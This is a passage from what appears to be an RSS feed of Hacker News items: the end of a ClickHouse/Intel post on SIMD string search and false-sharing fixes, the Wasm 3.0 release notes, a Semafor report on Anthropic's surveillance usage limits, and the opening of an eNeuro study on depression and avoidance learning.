<li>CPU utilization during the merge phase improved</li>
</ul>
<p>Parallel merging can be extended to complex aggregation scenarios with careful attention to cancellation and error handling.</p>

<p>Harnessing the full potential of SIMD instructions is notoriously difficult. Compilers are conservative about vectorization, and database workloads often have complex control flows that inhibit auto-vectorization.</p>
<p>Effective usage of SIMD instructions in databases requires thinking beyond traditional vectorization. Besides processing N data items simultaneously instead of one, one can also utilize parallel SIMD comparisons for smart pruning strategies which lead to less work done overall. This idea is particularly powerful for string operations. These are at the same time frequently used in practice and computationally expensive.</p>

<p>String search (e.g. plain substring search or LIKE pattern search) is a bottleneck in a lot of queries, for example in ClickBench query Q20.</p>
<p><strong>Understanding string search in analytical queries</strong></p>
<p>Clickbench query 20 evaluates a LIKE pattern on millions of URLs, making fast string search crucial.</p>
<pre><code><span>SELECT</span> <span>COUNT</span>(<span>*</span>) <span>FROM</span> hits <span>WHERE</span> URL <span>LIKE</span> <span>'%google%'</span>
</code></pre>
<p><strong>Reducing false positives with two-character filtering</strong></p>
<p><a href="https://github.com/ClickHouse/ClickHouse/pull/46289/files">PR #46289</a> is based on the insight that SIMD instructions can be used in a smart way beyond brute-force parallelization. The original code already leveraged SIMD instructions but it only considered the search pattern’s first character, leading to expensive false positives. We rewrite the code to check the second character as well. This improved selectivity dramatically while adding only a negligible amount of new SIMD operations.</p>
<pre><code><span>/// Original code</span>
<span><span>class</span> <span>StringSearcher</span>
{</span>
    first_needle_character = needle[<span>0</span>];
    first_needle_character_vec = broadcast_to_simd_vector(first_needle_character);

    <span>void</span> <span>search</span><span>()</span>
    {
        <span>for</span> (position in haystack; step by <span>16</span> bytes)
        {
            haystack_chunk = load_16_bytes(haystack + position);
            first_matches = simd_compare_equal(haystack_chunk, first_needle_character_vec);
            match_mask = extract_match_positions(first_matches);

            <span>for</span> (<span>const</span> <span>auto</span> &amp; match : match_mask)
                <span>/// High false positive rate - many expensive verifications</span>
                <span>if</span> (full_string_match(haystack + match_pos, needle))
                    <span>return</span> match_pos;
        }
    }
}
</code></pre>
<pre><code><span>// Optimized code</span>
<span><span>class</span> <span>StringSearcher</span>
{</span>
    first_needle_character = needle[<span>0</span>];
    second_needle_character = needle[<span>1</span>];  <span>/// Second character</span>
    first_needle_character_vec = broadcast_to_simd_vector(first_needle_character);
    second_needle_character_vec = broadcast_to_simd_vector(second_needle_character);

    <span>void</span> <span>search</span><span>()</span>
    {
        <span>for</span> (position : haystack, step by <span>16</span> bytes)
        {
            haystack_chunk1 = load_16_bytes(haystack + position);
            haystack_chunk2 = load_16_bytes(haystack + position + <span>1</span>);

            <span>/// Compare both characters simultaneously</span>
            first_matches = simd_compare_equal(haystack_chunk1, first_needle_character_vec);
            second_matches = simd_compare_equal(haystack_chunk2, second_needle_character_vec);
            combined_matches = simd_and(first_matches, second_matches);

            match_mask = extract_match_positions(combined_matches);

            <span>for</span> (<span>const</span> <span>auto</span> &amp; match : match_mask)
                <span>// Dramatically fewer false positives - fewer expensive verifications</span>
                <span>if</span> <span>full_string_match</span><span>(haystack + match_pos, needle)</span>:
                    <span>return</span> match_pos;
        }
    }
}
</code></pre>
<p><strong>Performance impact</strong></p>
<p>Two-character SIMD filtering improved performance significantly:</p>
<ul>
<li>ClickBench query Q20 sped up by 35%</li>
<li>Other queries which perform substring matching saw an overall improvement of ~10%</li>
<li>The geometric mean of all queries improved by 4.1%</li>
</ul>
<p>The performance improvements are a result of fewer false positives, better cache locality and more efficient branch prediction.</p>
<p>Two-character SIMD filtering demonstrates that effective SIMD optimization isn't just about processing more data per instruction - it's about using SIMD's parallel comparison capabilities to improve the algorithmic efficiency. The two-character approach shows how a small number of additional SIMD operations can in some cases yield massive performance gains.</p>

<p>False sharing occurs when multiple threads access variables in the same cache. The CPU's cache coherence protocol works at cache line granularity, meaning that any cache line modifications - including modifications of two different variables - are treated as conflicts which require expensive synchronization between cores. On a 2 x 240 vCPUs system, false sharing can turn simple counter increments into system-wide performance disasters.</p>
<p>Eliminating false sharing requires how CPU cache coherence is implemented at the hardware level. It's not enough to optimize algorithms - to avoid false sharing, one must also optimize the memory layout to make sure that frequently-accessed data structures don't accidentally interfere with each other through cache line conflicts. This involves for example a strategic data layout and use of alignment and padding.</p>

<p>ClickBench query Q3 showed 36.6% of CPU cycles spent in <code>ProfileEvents::increment</code> on a 2×240 vCPU system. Performance profiling revealed a severe cache line contention.</p>
<p><strong>ProfileEvents counters at scale</strong></p>
<p>Profile event counters refer to ClickHouse's internal eventing system - profile events track all internal operations, from detailed query execution steps to memory allocations. In a typical analytical query, these counters are incremented millions of times across all threads. The original implementation organized multiple counters in the same memory region without considering cache line boundaries.</p>
<p>This creates three challenges:</p>
<ol>
<li>
<p><strong>Cache line physics</strong>: Modern Intel processors use 64-byte cache lines. When any byte in a cache line is modified, the entire line must be invalidated in the other cores' caches.</p>
</li>
<li>
<p><strong>False sharing amplification</strong>: With 240 threads, each counter update triggers a cache line invalidation across potentially dozens of cores. What should be independent operations become serialized through the cache coherence protocol.</p>
</li>
<li>
<p><strong>Exponential degradation</strong>: As the number of cores increases, the probability of a simultaneous access to the same cache line grows exponentially, compounding the impact of cache misses.</p>
</li>
</ol>
<p>Using perf, I discovered that <code>ProfileEvents::increment</code> was generating massive cache coherence traffic. The smoking gun was the cache line utilization report that showed eight different counters packed into a single cache line. We also added new capabilities to Linux’s perf c2c tool and worked with the community to help developers more easily identify false sharing issues like this.</p>
<p><img src="https://clickhouse.com/uploads/intel_img_5_64dd7ef454.png" alt="intel_img_5.png" loading="lazy"></p>
<p><em>Perf analysis showing 36.6% cycles in ProfileEvents::increment</em></p><p>Proper cache line alignment ensures that each counter gets its own 64-byte cache line. This transforms false sharing (bad) into true sharing (manageable). When a thread updates its counter, now only a single cache line wil be affected.</p>
<p>Based on our implementation in <a href="https://github.com/ClickHouse/ClickHouse/pull/82697/files">PR #82697</a>, the fix improved the cache line alignment for the profile event counters:</p>
<pre><code><span>// Before: Counters packed without alignment</span>
<span><span>struct</span> <span>ProfileEvents</span>:</span>
    <span>atomic_value</span> counters[NUM_EVENTS]  <span>// Multiple counters per cache line</span>
    <span>// 8 counters sharing single 64-byte cache lines</span>

<span>// After: Cache line aligned counters  </span>
<span><span>struct</span> <span>ProfileEvents</span>:</span>
    <span>struct</span> <span>alignas</span><span>(<span>64</span>)</span> AlignedCounter:
        <span>atomic_value</span> value
        <span>// Padding automatically added to reach 64 bytes</span>
    
    AlignedCounter counters[NUM_EVENTS]  <span>// Each counter gets own cache line</span>
    <span>// Now each counter has exclusive cache line ownership</span>
</code></pre>
<p><strong>Performance impact</strong></p>
<p>This optimization pattern applies to any frequently updated shared and compact data structure. The lesson is that the memory layout becomes critical at scale - what works fine on eight cores can be excruciatingly slow on 240 cores.</p>
<p><img src="https://clickhouse.com/uploads/intel_img_6_d32f81bea1.png" alt="intel_img_6.png" loading="lazy"></p>
<p><em>After optimization: ProfileEvents::increment drops to 8.5% (from 36.6%)</em></p><p>As a result of our optimization, ClickBench query Q3 saw a 27.4% improvement on ultra-high core count systems. The performance gain increases with the number of cores because the cache coherence overhead grows super-linearly. This optimization therefore doesn't merely fix a bottleneck - it changes the scalability curve.</p>
<p><img src="https://clickhouse.com/uploads/intel_img_7_651eaa2f76.png" alt="intel_img_7.png" loading="lazy"></p>
<p><em>ClickBench Q3: 27.4% improvement, with larger gains on higher core count systems</em></p>
<p>In this post I covered optimizations for five performance bottlenecks:</p>
<ol>
<li><strong>Lock contention</strong> - The coordination overhead grows exponentially with core count.</li>
<li><strong>Memory optimization</strong> - The memory bandwidth per core decreases as the core count increases.</li>
<li><strong>Increased parallelism</strong> - Serial phases become the dominant bottleneck.</li>
<li><strong>SIMD optimization</strong> - Smarter algorithms like two-character filtering beyond brute-force vectorization can improve performance significantly.</li>
<li><strong>False sharing</strong> - False sharing is caused by the granularity of cache line size.</li>
</ol>
<p>The bottlenecks and optimizations presented here are not just about ClickHouse - they represent a fundamental shift in how we must approach database optimization in the ultra-high core count era. As processors continue to evolve toward higher core counts, these techniques will become essential for any system that needs to scale.</p>
<p>Our optimizations enable ClickHouse to achieve close-to-linear scalability as the core count increases. This enables ClickHouse to thrive as an analytics database in a future world where Intel and other hardware manufacturers push the core count into the thousands.</p>
<p><img src="https://clickhouse.com/uploads/Team2_16ed51dacb.jpg" alt="Team2.jpg" loading="lazy"></p>
<hr>
<h2 id="references-and-resources"><strong>References and Resources</strong> </h2>
<ul>
<li><strong>Source Code</strong>: All optimizations available in ClickHouse main branch</li>
<li><strong>Slide Deck</strong>: <a href="https://github.com/ClickHouse/clickhouse-presentations/blob/master/2025-meetup-Shanghai-1/Talk%204%20-%20Intel%20-%20Shanghai%20Meetup_01Mar25.pdf">2025 Shanghai Meetup Presentation</a></li>
<li><strong>Pull Requests</strong>: Individual PRs linked throughout this post with detailed performance analysis</li>
<li><strong>Intel Intrinsics Guide</strong>: <a href="https://www.intel.com/content/www/us/en/docs/intrinsics-guide/index.html">Intel® Intrinsics Guide</a></li>
</ul>

<p>Special thanks to the ClickHouse community for rigorous code review and performance validation. These optimizations represent collaborative effort between Intel and ClickHouse teams to unlock the full potential of modern ultra-high core count processors.</p>
<hr>
<p><em>For questions about implementation details or performance reproduction, please refer to the individual PR discussions linked throughout this post.</em></p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[WASM 3.0 Completed (879 pts)]]></title>
            <link>https://webassembly.org/news/2025-09-17-wasm-3.0/</link>
            <guid>45279384</guid>
            <pubDate>Wed, 17 Sep 2025 18:16:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webassembly.org/news/2025-09-17-wasm-3.0/">https://webassembly.org/news/2025-09-17-wasm-3.0/</a>, See on <a href="https://news.ycombinator.com/item?id=45279384">Hacker News</a></p>
<div id="readability-page-1" class="page">
    <header>
      
    </header>
    

<div>
    

<p><em>Published on September 17, 2025 by <a href="https://github.com/rossberg">Andreas Rossberg</a>.</em></p>

<p>Three years ago, <a href="https://webassembly.org/news/2025-03-20-wasm-2.0/">version 2.0</a> of the Wasm standard was (essentially) finished, which brought a number of new features, such as vector instructions, bulk memory operations, multiple return values, and simple reference types.</p>

<p>In the meantime, the Wasm W3C Community Group and Working Group have not been lazy. Today, we are happy to announce the release of Wasm 3.0 as the new “live” standard.</p>

<p><img src="https://webassembly.org/assets/wasm3_0.png" alt="Title page of the WebAssembly Specification, Release 3.0, 2025-09-17"></p>

<p>This is a substantially larger update: several big features, some of which have been in the making for six or eight years, finally made it over the finishing line.</p>

<ul>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/memory64/Overview.md"><em>64-bit address space.</em></a> Memories and tables can now be declared to use <code>i64</code> as their address type instead of just <code>i32</code>. That expands the available address space of Wasm applications from 4 gigabytes to (theoretically) 16 exabytes, to the extent that physical hardware allows. While the web will necessarily keep enforcing certain limits — on the web, a 64-bit memory is limited to 16 gigabytes — the new flexibility is especially interesting for non-web ecosystems using Wasm, as they can support much, much larger applications and data sets now.</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/multi-memory/Overview.md"><em>Multiple memories.</em></a> Contrary to popular belief, Wasm applications were always able to use multiple memory objects — and hence multiple address spaces — simultaneously. However, previously that was only possible by declaring and accessing each of them in separate modules. This gap has been closed, a single module can now declare (define or import) multiple memories and directly access them, including directly copying data between them. This finally allows tools like wasm-merge, which perform “static linking” on two or more Wasm modules by merging them into one, to work for <em>all</em> Wasm modules. It also paves the way for new uses of separate address spaces, e.g., for security (separating private data), for buffering, or for instrumentation.</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/gc/Overview.md"><em>Garbage collection.</em></a> In addition to expanding the capabilities of raw linear memories, Wasm also adds support for a new (and separate) form of storage that is automatically managed by the Wasm runtime via a garbage collector. Staying true to the spirit of Wasm as a low-level language, Wasm GC is low-level as well: a compiler targeting Wasm can declare the memory layout of its runtime data structures in terms of struct and array types, plus unboxed tagged integers, whose allocation and lifetime is then handled by Wasm. But that’s it. Everything else, such as engineering suitable representations for source-language values, including implementation details like method tables, remains the responsibility of compilers targeting Wasm. There are no built-in object systems, nor closures or other higher-level constructs — which would inevitably be heavily biased towards specific languages. Instead, Wasm only provides the basic building blocks for representing such constructs and focuses purely on the memory management aspect.</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/function-references/Overview.md"><em>Typed references.</em></a> The GC extension is built upon a substantial extension to the Wasm type system, which now supports much richer forms of references. Reference types can now describe the exact shape of the referenced heap value, avoiding additional runtime checks that would otherwise be needed to ensure safety. This more expressive typing mechanism, including subtyping and type recursion, is also available for function references, making it possible to perform safe indirect function calls without any runtime type or bounds check, through the new <code>call_ref</code> instruction.</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/tail-call/Overview.md"><em>Tail calls.</em></a> Tail calls are a variant of function calls that immediately exit the current function, and thereby avoid taking up additional stack space. Tail calls are an important mechanism that is used in various language implementations both in user-visible ways (e.g., in functional languages) and for internal techniques (e.g., to implement stubs). Wasm tail calls are fully general and work for callees both selected statically (by function index) and dynamically (by reference or table).</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/exception-handling/Exceptions.md"><em>Exception handling.</em></a> Exceptions provide a way to locally abort execution, and are a common feature in modern programming languages. Previously, there was no efficient way to compile exception handling to Wasm, and existing compilers typically resorted to convoluted ways of implementing them by escaping to the host language, e.g., JavaScript. This was neither portable nor efficient. Wasm 3.0 hence provides native exception handling within Wasm. Exceptions are defined by declaring exception tags with associated payload data. As one would expect, an exception can be thrown, and selectively be caught by a surrounding handler, based on its tag. Exception handlers are a new form of block instruction that includes a dispatch list of tag/label pairs or catch-all labels to define where to jump when an exception occurs.</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/relaxed-simd/Overview.md"><em>Relaxed vector instructions.</em></a> Wasm 2.0 added a large set of vector (SIMD) instructions, but due to differences in hardware, some of these instructions have to do extra work on some platforms to achieve the specified semantics. In order to squeeze out maximum performance, Wasm 3.0 introduces “relaxed” variants of these instructions that are allowed to have implementation-dependent behavior in certain edge cases. This behavior must be selected from a pre-specified set of legal choices.</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/profiles/blob/main/proposals/profiles/Overview.md"><em>Deterministic profile.</em></a> To make up for the added semantic fuzziness of relaxed vector instructions, and in order to support settings that demand or need deterministic execution semantics (such as blockchains, or replayable systems), the Wasm standard now specifies a deterministic default behavior for every instruction with otherwise non-deterministic results — currently, this includes floating-point operators and their generated NaN values and the aforementioned relaxed vector instructions. Between platforms choosing to implement this deterministic execution profile, Wasm thereby is fully deterministic, reproducible, and portable.</p>
  </li>
  <li>
    <p><a href="https://github.com/WebAssembly/spec/blob/wasm-3.0/proposals/annotations/Overview.md"><em>Custom annotation syntax.</em></a> Finally, the Wasm text format has been enriched with generic syntax for placing annotations in Wasm source code. Analogous to custom sections in the binary format, these annotations are not assigned any meaning by the Wasm standard itself, and can be chosen to be ignored by implementations. However, they provide a way to represent the information stored in custom sections in human-readable and writable form, and concrete annotations can be specified by downstream standards.</p>
  </li>
</ul>

<p>In addition to these core features, embeddings of Wasm into JavaScript benefit from a new extension to the JS API:</p>

<ul>
  <li><a href="https://github.com/WebAssembly/js-string-builtins/blob/main/proposals/js-string-builtins/Overview.md"><em>JS string builtins.</em></a> JavaScript string values can already be passed to Wasm as externrefs. Functions from this new primitive library can be imported into a Wasm module to directly access and manipulate such external string values inside Wasm.</li>
</ul>

<p>With these new features, Wasm has much better support for compiling high-level programming languages. Enabled by this, we have seen various new languages popping up to target Wasm, such as <a href="https://github.com/google/j2cl/blob/master/docs/getting-started-j2wasm.md">Java</a>, <a href="https://dune.readthedocs.io/en/stable/wasmoo.html">OCaml</a>, <a href="https://www.scala-js.org/doc/project/webassembly.html">Scala</a>, <a href="https://kotlinlang.org/docs/wasm-overview.html">Kotlin</a>, <a href="https://spritely.institute/hoot/">Scheme</a>, or <a href="https://dart.dev/web/wasm">Dart</a>, all of which use the new GC feature.</p>

<p>On top of all these goodies, Wasm 3.0 also is the first version of the standard that has been produced with the new <a href="https://webassembly.org/news/2025-03-27-spectec/">SpecTec</a> tool chain. We believe that this makes for an even more reliable specification.</p>

<p>Wasm 3.0 is already shipping in most major web browsers, and support in stand-alone engines like Wasmtime is on track to completion as well. The <a href="https://webassembly.org/features/">Wasm feature status</a> page tracks support across engines.</p>

  </div>
  
  

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[DeepMind and OpenAI win gold at ICPC (223 pts)]]></title>
            <link>https://codeforces.com/blog/entry/146536</link>
            <guid>45279357</guid>
            <pubDate>Wed, 17 Sep 2025 18:15:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://codeforces.com/blog/entry/146536">https://codeforces.com/blog/entry/146536</a>, See on <a href="https://news.ycombinator.com/item?id=45279357">Hacker News</a></p>
Couldn't get https://codeforces.com/blog/entry/146536: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Anthropic irks White House with limits on models’ use (229 pts)]]></title>
            <link>https://www.semafor.com/article/09/17/2025/anthropic-irks-white-house-with-limits-on-models-uswhite-house-with-limits-on-models-use</link>
            <guid>45279143</guid>
            <pubDate>Wed, 17 Sep 2025 17:57:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.semafor.com/article/09/17/2025/anthropic-irks-white-house-with-limits-on-models-uswhite-house-with-limits-on-models-use">https://www.semafor.com/article/09/17/2025/anthropic-irks-white-house-with-limits-on-models-uswhite-house-with-limits-on-models-use</a>, See on <a href="https://news.ycombinator.com/item?id=45279143">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Anthropic is in the midst of a splashy media tour in Washington, but its refusal to allow its models to be used for some law enforcement purposes has deepened hostility to the company inside the Trump administration, two senior officials told Semafor.</p><p>Anthropic recently declined requests by contractors working with federal law enforcement agencies because the company refuses to make an exception allowing its AI tools to be used for some tasks, including surveillance of US citizens, said the officials, who spoke to Semafor on the condition of anonymity.</p><p>The tensions come at a moment when Donald Trump’s White House has championed American AI companies as patriotic bulwarks of global competition —&nbsp;and expect the companies to repay that loyalty. The officials said they worried that Anthropic was selectively enforcing its policies based on politics and using vague terminology to allow its rules to be interpreted broadly.</p><p>For instance, Anthropic currently limits how the FBI, Secret Service and Immigration, and Customs Enforcement can use its AI models because those agencies conduct surveillance, which is prohibited by Anthropic’s <a href="https://www.anthropic.com/legal/aup" rel="noopener" target="_blank">usage policy</a>.</p><p>One of the officials said Anthropic’s position, which has long been in effect, amounts to making a moral judgment about how law enforcement agencies do their jobs.</p><p>The policy doesn’t specifically define what it means by “domestic surveillance” in a law enforcement context and appears to be using the term broadly, creating room for interpretation.</p><p>Other AI model providers also list restrictions on surveillance, but offer more specific examples and often have carveouts for law enforcement activities. OpenAI’s <a href="https://openai.com/policies/usage-policies/" rel="noopener" target="_blank">policy</a>, for instance, prohibits “unauthorized monitoring of individuals,” implying consent for legal monitoring by law enforcement.</p><p>Anthropic declined to comment.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DeepSeek writes less secure code for groups China disfavors (244 pts)]]></title>
            <link>https://www.washingtonpost.com/technology/2025/09/16/deepseek-ai-security/</link>
            <guid>45278740</guid>
            <pubDate>Wed, 17 Sep 2025 17:24:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.washingtonpost.com/technology/2025/09/16/deepseek-ai-security/">https://www.washingtonpost.com/technology/2025/09/16/deepseek-ai-security/</a>, See on <a href="https://news.ycombinator.com/item?id=45278740">Hacker News</a></p>
Couldn't get https://www.washingtonpost.com/technology/2025/09/16/deepseek-ai-security/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Depression Reduces Capacity to Learn to Actively Avoid Aversive Events (190 pts)]]></title>
            <link>https://www.eneuro.org/content/12/9/ENEURO.0034-25.2025</link>
            <guid>45278686</guid>
            <pubDate>Wed, 17 Sep 2025 17:20:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eneuro.org/content/12/9/ENEURO.0034-25.2025">https://www.eneuro.org/content/12/9/ENEURO.0034-25.2025</a>, See on <a href="https://news.ycombinator.com/item?id=45278686">Hacker News</a></p>
<div id="readability-page-1" class="page"><div class="page" id="page">
	  <div data-node-nid="3811664" id="top-node-3811664--21755481293" data-pisa="eneuro;12/9/ENEURO.0034-25.2025" data-pisa-master="eneuro;ENEURO.0034-25.2025" data-apath="/eneuro/12/9/ENEURO.0034-25.2025.atom" data-hw-author-tooltip-instance="highwire_author_tooltip">
  
  
      <p><span>Research Article</span><span></span><span><span>Research Article: New Research, Cognition and Behavior</span></span></p>
  
  
        
    	<p><span>, <span data-delta="1">Brandon J. Forys</span>, <span data-delta="2">Liz Kalenteridis</span>, <span data-delta="3">Ian D. Daly</span>, <span data-delta="4">Alex R. Terpstra</span>, <span data-delta="5">Luke Clark</span>, <span data-delta="6">Stan B. Floresco</span>, <span data-delta="7">Trisha Chakrabarty</span> and <span data-delta="8">Rebecca M. Todd</span></span></p>
  
    	<p><span>eNeuro </span><span>1 September 2025,  </span><span>12 </span><span>(9) </span><span>ENEURO.0034-25.2025; </span><span>https://doi.org/10.1523/ENEURO.0034-25.2025 </span></p>
  
  
  
</div> <!-- /.panel-row-wrapper -->	
	  
  <div xmlns="http://www.w3.org/1999/xhtml" data-highwire-cite-ref-tooltip-instance="highwire_reflinks_tooltip" xmlns:xhtml="http://www.w3.org/1999/xhtml" data-panels-ajax-tab-preloaded="jnl_sfneneuro_tab_art" id="panels-ajax-tab-container-highwire_article_tabs"><div id="abstract-1"><h2>Abstract</h2><p id="p-5">Depression and anxiety are often characterized by altered reward-seeking and avoidance, respectively. Yet less is known about the relationship between depressive symptoms and specific avoidance behaviors. To address this gap, we conducted two studies. In Study 1, undergraduates and online workers completed an uninstructed go/no-go avoidance task (<em>N</em><sub>Total</sub> = 465) as a reverse translation of a rodent paradigm. Participants exhibited a wide range of symptom scores on the Beck Depression Inventory-II (BDI-II), ranging from low to severe. In Study 1, cues were used to signal the response type (go/active vs no-go/inhibitory) required to avoid an aversive sound. Higher depressive scores were associated with poorer acquisition of active avoidance in undergraduates. Overall participants showed lower accuracy for active than inhibitory avoidance. To examine whether the better no-go trial performance reflected a prepotent response to avoid aversive outcomes, in Study 2, undergraduates (<em>N</em><sub>Total</sub> = 330) completed a version of the task that included reward-seeking. Here all participants showed higher accuracy for active reward-seeking and inhibitory avoidance, consistent with a prepotent response to inhibit action to avoid aversive consequences. These findings suggest that in young adults, depressive symptoms are associated with difficulty in overriding prepotent responses to actively avoid aversive outcomes in the absence of reward. This work bridges the gap between preclinical animal models and clinical research, offering insights that could guide the development of more targeted clinical interventions.</p></div><ul><li><a href="https://www.eneuro.org/keyword/avoidance" rel="nofollow">avoidance</a></li><li><a href="https://www.eneuro.org/keyword/beck-depression-inventory" rel="nofollow">Beck Depression Inventory</a></li><li><a href="https://www.eneuro.org/keyword/depression" rel="nofollow">depression</a></li><li><a href="https://www.eneuro.org/keyword/dimensional-approaches" rel="nofollow">dimensional approaches</a></li><li><a href="https://www.eneuro.org/keyword/effort-cost" rel="nofollow">effort cost</a></li><li><a href="https://www.eneuro.org/keyword/translational-research" rel="nofollow">translational research</a></li></ul><div id="sec-1"><h2>Significance Statement</h2><p id="p-6">Translational studies in community samples are crucial for bridging the gap between rodent models, which delineate neural circuitry and pharmacology underlying specific behaviors, and the presentation of mood disorders in clinic settings. Building on rodent studies of avoidance behaviors, thought to be linked to depression, this study examines how depressive symptom scores relate to specific types of avoidance. Our findings revealed that higher depressive symptom scores were associated with reduced capacity to learn active avoidance behaviors, which involved overriding a prepotent response to inhibit action to avoid aversive consequences. This work bridges the gap between preclinical animal models and clinical research, offering insights that may guide the development of more targeted clinical interventions.</p></div><div id="sec-2"><h2>Introduction</h2><p id="p-7">Stimuli that predict aversive events typically evoke avoidance responses aimed at minimizing anticipated threats. Depending on the situation, an active strategy, such as taking an action (walking away), may be most effective, while in other situations, the inhibition of motor output (staying put to avoid detection) may be the more prudent strategy. Although effective in many contexts, these strategies can become maladaptive in depression and anxiety, interfering with goal-directed behavior (<a id="xref-ref-52-1" href="#ref-52">Ottenbreit et al., 2014</a>; <a id="xref-ref-34-1" href="#ref-34">Haskell et al., 2020</a>).</p><p id="p-8">Depression is a leading cause of global disability (<a id="xref-ref-74-1" href="#ref-74">Whiteford et al., 2013</a>; <a id="xref-ref-75-1" href="#ref-75">World Health Organization, 2017</a>), yet its cognitive and behavioral mechanisms remains to be fully understood. The Altered Computations underlying Decision Making (ACDM) framework posits that decision-making biases perpetuate both depression and anxiety (<a id="xref-ref-9-1" href="#ref-9">Bishop and Gagne, 2018</a>). Depression is marked by reduced engagement in reward-seeking, while anxiety by heightened avoidance. In depression, impairments arise from underestimating the probability and value of positive outcomes, and overestimating the effort required to obtain them (<a id="xref-ref-9-2" href="#ref-9">Bishop and Gagne, 2018</a>), ultimately leading to reduced engagement in actions. Supporting this view, individuals with major depressive disorder (MDD) choose high-effort, high-reward options less frequently, anticipate fewer positive experiences, and rate them as less pleasurable (<a id="xref-ref-45-1" href="#ref-45">MacLeod and Salaminiou, 2001</a>; <a id="xref-ref-69-1" href="#ref-69">Treadway et al., 2012</a>; <a id="xref-ref-49-1" href="#ref-49">Mukherjee et al., 2020</a>; <a id="xref-ref-37-1" href="#ref-37">Horne et al., 2021</a>). Although the ACDM primarily distinguishes between depression-related biases in reward-seeking, it also suggests that effort-related impairments may extend to avoidance contexts and contribute to reduced active avoidance.</p><p id="p-9">Despite this, the role of active versus inhibitory forms of avoidance remains underexplored in depression, reflecting broader trends in which negatively valenced systems are predominantly studied in anxiety (<a id="xref-ref-17-1" href="#ref-17">Craske et al., 2009</a>). Cognitive theories of depression emphasize a negativity bias in attention, memory, and future expectations (<a id="xref-ref-47-1" href="#ref-47">Mogg et al., 2006</a>; <a id="xref-ref-26-1" href="#ref-26">Fales et al., 2008</a>; <a id="xref-ref-21-1" href="#ref-21">Disner et al., 2011</a>) but often rely on self-report and lack emphasis on behaviors with translational utility for identifying cross-species neurobiological mechanisms.</p><p id="p-10">Reinforcement learning tasks offer a translational approach for examining negatively valenced systems and have been applied across neuropsychiatric conditions (<a id="xref-ref-24-1" href="#ref-24">Endrass et al., 2011</a>; <a id="xref-ref-54-1" href="#ref-54">Palminteri et al., 2012</a>; <a id="xref-ref-59-1" href="#ref-59">Reinen et al., 2016</a>; <a id="xref-ref-72-1" href="#ref-72">Waltz et al., 2018</a>), including depression (<a id="xref-ref-16-1" href="#ref-16">Chase et al., 2010</a>; <a id="xref-ref-60-1" href="#ref-60">Robinson et al., 2012</a>; <a id="xref-ref-46-1" href="#ref-46">Mkrtchian et al., 2017</a>; <a id="xref-ref-49-2" href="#ref-49">Mukherjee et al., 2020</a>; <a id="xref-ref-64-1" href="#ref-64">Smith et al., 2023</a>). These studies typically involve probabilistic and reversal learning tasks to probe sensitivity to reward and punishment. Findings remain mixed: some report reward-specific impairments in depression (<a id="xref-ref-60-2" href="#ref-60">Robinson et al., 2012</a>), others find broader impairments across valence (<a id="xref-ref-16-2" href="#ref-16">Chase et al., 2010</a>; <a id="xref-ref-46-2" href="#ref-46">Mkrtchian et al., 2017</a>; <a id="xref-ref-49-3" href="#ref-49">Mukherjee et al., 2020</a>) or even heightened punishment sensitivity (<a id="xref-ref-50-1" href="#ref-50">Murphy et al., 2003</a>; <a id="xref-ref-51-1" href="#ref-51">Nord et al., 2018</a>), while others identify learning-specific impairments (<a id="xref-ref-16-3" href="#ref-16">Chase et al., 2010</a>; <a id="xref-ref-49-4" href="#ref-49">Mukherjee et al., 2020</a>). These inconsistencies highlight the need for behavioral assays that isolate avoidance processes and align with cross-species models.</p><p id="p-11">Translational gaps can stem from task design. Human studies typically use secondary reinforcers (i.e., monetary rewards or feedback), with punishment operationalized as monetary loss, and avoidance inferred from decreased selection of high-loss options, often omitting safety signals. In contrast, animal paradigms use primary reinforcers (i.e., shock) and deterministic contingencies and explicitly distinguish between active and inhibitory avoidance (<a id="xref-ref-57-1" href="#ref-57">Piantadosi et al., 2018</a>; <a id="xref-ref-14-1" href="#ref-14">Capuzzo and Floresco, 2020</a>). Although functional magnetic resonance imaging (fMRI) studies show overlapping blood-oxygenation-level-dependent (BOLD) responses to primary and secondary aversive cues, regions like the amygdala are more responsive to primary aversive cues (<a id="xref-ref-20-1" href="#ref-20">Delgado et al., 2011</a>). Importantly, shared BOLD activation does not necessarily imply equivalent neural mechanisms—especially when task features might differ meaningfully. Translating animal behavioral paradigms to humans has been proposed as a promising strategy to enhance cross-species translation and improve psychiatric treatment development (<a id="xref-ref-39-1" href="#ref-39">Kirlic et al., 2017</a>).</p><p id="p-12">To address these gaps, we adapted a validated rodent task designed to assess both active and inhibitory avoidance (<a id="xref-ref-57-2" href="#ref-57">Piantadosi et al., 2018</a>; <a id="xref-ref-14-2" href="#ref-14">Capuzzo and Floresco, 2020</a>) and deployed it in a large online sample. While prior human studies have included related features, our avoidance task was modeled to parallel the original rodent paradigm. Our aim was to examine how depressive symptom severity relates to the ability to learn and flexibly implement active and inhibitory avoidance strategies. Using a dimensional approach aligned with Research Domain Criteria (RDoC) principles, we recruited a nonclinical sample reporting a broad range of depressive symptoms. We hypothesized that higher depressive symptom scores would be associated with impairments in active—but not inhibitory—avoidance, consistent with ACDM predictions of reduced behavioral engagement stemming from effort overestimation.</p></div><div id="sec-3"><h2>Materials and Methods</h2><div id="sec-4"><h3>Study 1 (avoidance)</h3><div 